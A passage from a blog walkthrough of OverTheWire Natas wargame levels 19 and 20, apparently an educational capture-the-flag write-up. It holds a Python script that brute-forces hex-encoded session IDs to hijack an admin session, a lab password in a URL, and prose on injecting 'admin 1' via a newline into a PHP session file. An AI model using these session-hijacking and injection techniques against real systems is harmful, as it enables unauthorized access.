<span class="c1"># Good message to search for
</span><span class="n">gstr</span> <span class="o">=</span> <span class="s">"Password"</span>
<span class="n">bstr</span> <span class="o">=</span> <span class="s">"logged in as a regular user"</span>

<span class="c1"># Our target URL
</span><span class="n">target</span> <span class="o">=</span> <span class="s">'http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org/'</span>

<span class="c1"># Checking if we can connect to the target, just in case...
</span><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
<span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="n">requests</span><span class="p">.</span><span class="n">codes</span><span class="p">.</span><span class="n">ok</span><span class="p">:</span>
  <span class="k">raise</span> <span class="nb">ValueError</span><span class="p">(</span><span class="s">'Couldn</span><span class="se">\'</span><span class="s">t connect to target :('</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
  <span class="k">print</span><span class="p">(</span><span class="s">'Target reachable. Starting character parsing...'</span><span class="p">)</span>

<span class="c1"># Send request with incrementing session id in a loop until we get admin
</span><span class="n">num</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span><span class="p">(</span><span class="n">num</span> <span class="o">&lt;</span> <span class="mi">640</span><span class="p">):</span>
  <span class="n">num</span> <span class="o">+=</span> <span class="mi">1</span>
  <span class="n">session</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">+</span> <span class="s">"-admin"</span>
  <span class="n">session</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"Attempting Session ID: "</span> <span class="o">+</span> <span class="n">session</span><span class="p">.</span><span class="nb">hex</span><span class="p">())</span>
  <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Cookie'</span><span class="p">:</span> <span class="s">'PHPSESSID='</span> <span class="o">+</span> <span class="n">session</span><span class="p">.</span><span class="nb">hex</span><span class="p">()}</span>
  <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
  <span class="k">if</span> <span class="n">bstr</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">break</span></code></pre></figure><p> </p><h3 id="level-20"><span class="mr-2">LEVEL 20</span><a href="#level-20" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><img class="alignnone size-full wp-image-257" data-src="/assets/img/2019/09/2019-09-16_08h53_40.png" data-proofer-ignore></p><p>sourcecode:</p><figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?</span>

<span class="k">function</span> <span class="n">debug</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="p">{</span> 
  <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"debug"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">print</span> <span class="s2">"DEBUG: </span><span class="nv">$msg</span><span class="s2">&lt;br&gt;"</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">print_credentials</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">and</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"admin"</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"admin"</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">print</span> <span class="s2">"You are an admin. The credentials for the next level are:&lt;br&gt;"</span><span class="p">;</span>
  <span class="k">print</span> <span class="s2">"&lt;pre&gt;Username: natas21</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
  <span class="k">print</span> <span class="s2">"Password: &lt;censored&gt;&lt;/pre&gt;"</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="k">print</span> <span class="s2">"You are logged in as a regular user. Login as an admin to retrieve credentials for natas21."</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>


<span class="cm">/* we don't need this */</span>
<span class="k">function</span> <span class="n">myopen</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="nv">$name</span><span class="p">)</span> <span class="p">{</span> 
  <span class="c1">//debug("MYOPEN $path $name"); </span>
  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span> 
<span class="p">}</span>

<span class="cm">/* we don't need this */</span>
<span class="k">function</span> <span class="n">myclose</span><span class="p">()</span> <span class="p">{</span> 
  <span class="c1">//debug("MYCLOSE"); </span>
  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span> 
<span class="p">}</span>

<span class="k">function</span> <span class="n">myread</span><span class="p">(</span><span class="nv">$sid</span><span class="p">)</span> <span class="p">{</span> 
  <span class="nf">debug</span><span class="p">(</span><span class="s2">"MYREAD </span><span class="nv">$sid</span><span class="s2">"</span><span class="p">);</span> 
  <span class="k">if</span><span class="p">(</span><span class="nb">strspn</span><span class="p">(</span><span class="nv">$sid</span><span class="p">,</span> <span class="s2">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-"</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$sid</span><span class="p">))</span> <span class="p">{</span>
  <span class="nf">debug</span><span class="p">(</span><span class="s2">"Invalid SID"</span><span class="p">);</span> 
    <span class="k">return</span> <span class="s2">""</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">session_save_path</span><span class="p">()</span> <span class="mf">.</span> <span class="s2">"/"</span> <span class="mf">.</span> <span class="s2">"mysess_"</span> <span class="mf">.</span> <span class="nv">$sid</span><span class="p">;</span>
  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span>
    <span class="nf">debug</span><span class="p">(</span><span class="s2">"Session file doesn't exist"</span><span class="p">);</span>
    <span class="k">return</span> <span class="s2">""</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="nf">debug</span><span class="p">(</span><span class="s2">"Reading from "</span><span class="mf">.</span> <span class="nv">$filename</span><span class="p">);</span>
  <span class="nv">$data</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
  <span class="nv">$_SESSION</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
  <span class="k">foreach</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
    <span class="nf">debug</span><span class="p">(</span><span class="s2">"Read [</span><span class="nv">$line</span><span class="s2">]"</span><span class="p">);</span>
  <span class="nv">$parts</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">" "</span><span class="p">,</span> <span class="nv">$line</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">""</span><span class="p">)</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="nv">$parts</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="nb">session_encode</span><span class="p">();</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">mywrite</span><span class="p">(</span><span class="nv">$sid</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="p">{</span> 
  <span class="c1">// $data contains the serialized version of $_SESSION</span>
  <span class="c1">// but our encoding is better</span>
  <span class="nf">debug</span><span class="p">(</span><span class="s2">"MYWRITE </span><span class="nv">$sid</span><span class="s2"> </span><span class="nv">$data</span><span class="s2">"</span><span class="p">);</span> 
  <span class="c1">// make sure the sid is alnum only!!</span>
  <span class="k">if</span><span class="p">(</span><span class="nb">strspn</span><span class="p">(</span><span class="nv">$sid</span><span class="p">,</span> <span class="s2">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-"</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$sid</span><span class="p">))</span> <span class="p">{</span>
  <span class="nf">debug</span><span class="p">(</span><span class="s2">"Invalid SID"</span><span class="p">);</span> 
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">session_save_path</span><span class="p">()</span> <span class="mf">.</span> <span class="s2">"/"</span> <span class="mf">.</span> <span class="s2">"mysess_"</span> <span class="mf">.</span> <span class="nv">$sid</span><span class="p">;</span>
  <span class="nv">$data</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
  <span class="nf">debug</span><span class="p">(</span><span class="s2">"Saving in "</span><span class="mf">.</span> <span class="nv">$filename</span><span class="p">);</span>
  <span class="nb">ksort</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">);</span>
  <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
    <span class="nf">debug</span><span class="p">(</span><span class="s2">"</span><span class="nv">$key</span><span class="s2"> =&gt; </span><span class="nv">$value</span><span class="s2">"</span><span class="p">);</span>
    <span class="nv">$data</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"</span><span class="nv">$key</span><span class="s2"> </span><span class="nv">$value</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
  <span class="nb">chmod</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="mo">0600</span><span class="p">);</span>
<span class="p">}</span>

<span class="cm">/* we don't need this */</span>
<span class="k">function</span> <span class="n">mydestroy</span><span class="p">(</span><span class="nv">$sid</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">//debug("MYDESTROY $sid"); </span>
  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span> 
<span class="p">}</span>
<span class="cm">/* we don't need this */</span>
<span class="k">function</span> <span class="n">mygarbage</span><span class="p">(</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span> 
  <span class="c1">//debug("MYGARBAGE $t"); </span>
  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span> 
<span class="p">}</span>

<span class="nb">session_set_save_handler</span><span class="p">(</span>
  <span class="s2">"myopen"</span><span class="p">,</span> 
  <span class="s2">"myclose"</span><span class="p">,</span> 
  <span class="s2">"myread"</span><span class="p">,</span> 
  <span class="s2">"mywrite"</span><span class="p">,</span> 
  <span class="s2">"mydestroy"</span><span class="p">,</span> 
  <span class="s2">"mygarbage"</span><span class="p">);</span>
<span class="nb">session_start</span><span class="p">();</span>

<span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"name"</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
  <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"name"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"name"</span><span class="p">];</span>
  <span class="nf">debug</span><span class="p">(</span><span class="s2">"Name set to "</span> <span class="mf">.</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"name"</span><span class="p">]);</span>
<span class="p">}</span>

<span class="nf">print_credentials</span><span class="p">();</span>

<span class="nv">$name</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"name"</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">))</span> <span class="p">{</span>
  <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"name"</span><span class="p">];</span>
<span class="p">}</span>

<span class="cp">?&gt;</span></code></pre></figure><p>Figuring out this code and what it is doing took me a little while. What is positively super helpful is setting the “debug” flag. To do so, just add”?debug=1″ on the URL. That will help provide a lot of insight.</p><p>You’ll see that whatever you put into the form after “name”, the debug returns it as part of your name, and that works even if it’s on a new line! According to the source we have, when the code reads back data from the session file it does so line by line. So new lines mean new variables to the server side code, and the variable we’re interested in is “admin”. Therefore “admin” needs to be set after the name variable. One caveat though, variables set in forms are in the format “variable=value”, and that doesn’t work for the server side “admin” variable. That one actually needs to be in the format “variable value”.</p><p>So the way to get admin is, using Burp, add “admin 1” on a new line by itself after the “name” variable. Then you’ll have to load the page twice. Once for the code to write it into the session file on the server. And the second to read it back as an admin status.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/walkthrough/'>Walkthrough</a>, <a href='/categories/overthewire/'>OverTheWire</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=OverTheWire: NATAS 16 &amp;#8211; 20 - MegaWattSec&amp;url=https://megawattsec.com/posts/overthewire-natas-16/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=OverTheWire: NATAS 16 &amp;#8211; 20 - MegaWattSec&amp;u=https://megawattsec.com/posts/overthewire-natas-16/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://megawattsec.com/posts/overthewire-natas-16/&amp;text=OverTheWire: NATAS 16 &amp;#8211; 20 - MegaWattSec" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/hackthebox-haystack/">HackTheBox: Haystack</a><li><a href="/posts/hackthebox-craft/">HackTheBox: Craft</a><li><a href="/posts/hackthebox-bastion/">HackTheBox: Bastion</a><li><a href="/posts/hackthebox-jarvis/">HackTheBox: Jarvis</a><li><a href="/posts/hackthebox-swagshop/">HackTheBox: SwagShop</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/perl/">perl</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/anti-csrf/">anti-csrf</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/cve-2019-9185/">CVE-2019-9185</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/overthewire-natas-21/"><div class="card-body"> <em class="timeago small" data-ts="1568659795" > 2019-09-16 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OverTheWire: NATAS 21 &#8211; 25</h3><div class="text-muted small"><p> LEVEL 21 This level has a second site associated with it, where all the action is: Main Site PHP sourcecode of the main page: {% highlight php %} &amp;lt;? function print_credentials() { if...</p></div></div></a></div><div class="card"> <a href="/posts/overthewire-natas-26/"><div class="card-body"> <em class="timeago small" data-ts="1568918412" > 2019-09-19 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OverTheWire: NATAS 26 &#8211; 27</h3><div class="text-muted small"><p> LEVEL 26 The sourcecode: {% highlight php %} &amp;lt;?php // sry, this is ugly as hell. // cheers kaliman ;) // - morla class Logger{ private $logFile; private $initMsg; private ...</p></div></div></a></div><div class="card"> <a href="/posts/overthewire-natas-28/"><div class="card-body"> <em class="timeago small" data-ts="1569506683" > 2019-09-26 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OverTheWire: NATAS 28</h3><div class="text-muted small"><p> LEVEL 28 No sourcecode, this will be fun. The program takes your query and searches it against a list of jokes, possibly in a database (since it says “whack computer joke database”). Checking o...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/overthewire-natas-11/" class="btn btn-outline-primary" prompt="Older"><p>OverTheWire: NATAS 11 &#8211; 15</p></a> <a href="/posts/overthewire-natas-21/" class="btn btn-outline-primary" prompt="Newer"><p>OverTheWire: NATAS 21 &#8211; 25</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/megawattsec">Dustin</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/perl/">perl</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/anti-csrf/">anti-csrf</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/cve-2019-9185/">CVE-2019-9185</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
